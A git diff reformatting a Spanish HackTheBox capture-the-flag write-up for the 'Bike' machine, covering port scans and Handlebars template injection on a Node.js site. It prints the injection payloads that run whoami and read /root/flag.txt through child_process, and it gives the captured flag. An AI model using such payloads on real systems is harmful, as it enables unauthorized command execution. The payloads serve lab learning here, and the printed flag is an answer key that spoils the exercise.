@@ -1,25 +1,16 @@
 # Bike
 
-Plataforma: HackTheBox
-OS: Linux
-Level: Very Easy
-Status: Done
-Complete: Yes
-Created time: 6 de enero de 2025 14:02
-IP: 10.129.97.64
+Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 6 de enero de 2025 14:02 IP: 10.129.97.64
 
 ## Recopilación de información
 
-<aside>
 💡
-
-</aside>
 
 ### **Escaneo de puertos**
 
 Comenzamos con un escaneo para identificar que puertos están abiertos.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.97.64 -oG allports
@@ -33,7 +24,7 @@ PORT   STATE SERVICE REASON
 
 Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.
 
----
+***
 
 ```bash
 ❯ sudo nmap -p22,80 -sCV -vvv 10.129.97.64 -oN targeted
@@ -55,12 +46,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-- **Identificación de vulnerabilidades**
-    - *22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)*
-    - 
-    
-    80/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
-    
+*   **Identificación de vulnerabilidades**
+
+    * _22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)_
+    *
+
+    80/tcp open http syn-ack ttl 63 Node.js (Express middleware)
 
 **Enumeración Web**
 
@@ -75,27 +66,24 @@ http://10.129.97.64 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.97.64], JQu
 
 ## Explotación
 
-<aside>
 💡 El seguimiento de HackThBox nos indica que hay un posible fallo relacionado con un Server Side Template Injection
-
-</aside>
 
 ### Explotación 1
 
 Test SSTI: Probamos con un test
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](<../../.gitbook/assets/image (1).png>)
 
 ```bash
 Payload: Campo email
  {{7*7}} 
 ```
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](<../../.gitbook/assets/image 1 (1).png>)
 
 Vemos que da un error
 
-Revisando Hacktricks encontramos un Payload para Handlebars en Node.js 
+Revisando Hacktricks encontramos un Payload para Handlebars en Node.js
 
 ```bash
 {{#with "s" as |string|}}
@@ -123,8 +111,7 @@ URLencodeamos con BurpSuite para poder pasarlo con el request
 
 Obtenemos un error :
 
-The response shows an error that states require is not defined . Taking a look at the payload we notice
-the following code
+The response shows an error that states require is not defined . Taking a look at the payload we notice the following code
 
 ```bash
 {{this.push "return require('child_process').exec('whoami');"}}
@@ -173,9 +160,9 @@ Con la linia modificada :
 
 Ahora, con Burpsuite, URLEncodeamos el payload y lo enviamos en el campo “email”:
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](<../../.gitbook/assets/image 2 (1).png>)
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](<../../.gitbook/assets/image 3 (1).png>)
 
 Vemos que se ejecuta el comando “whoami” que enviamos en el payload.
 
@@ -188,7 +175,7 @@ Ahora probamos con otros comandos:
 /root');"}}
 ```
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 Por último, probamos a leer el contenido de la flag con:
 
@@ -197,13 +184,10 @@ Por último, probamos a leer el contenido de la flag con:
 /root/flag.txt');"}}
 ```
 
-![image.png](/images/HackTheBox/image%205.png)
+![image.png](<../../.gitbook/assets/image 5 (1).png>)
 
-Flag:  6b258d726d287462d60c103d0142a81c
+Flag: 6b258d726d287462d60c103d0142a81c
 
 ## Conclusión
 
-<aside>
 💡 Maquina establecida como muy fácil, pero que al no conocer Node.js ni como proceder a explotar un SSTI, me ha supuesto tener que mirar el Writeup
-
-</aside>
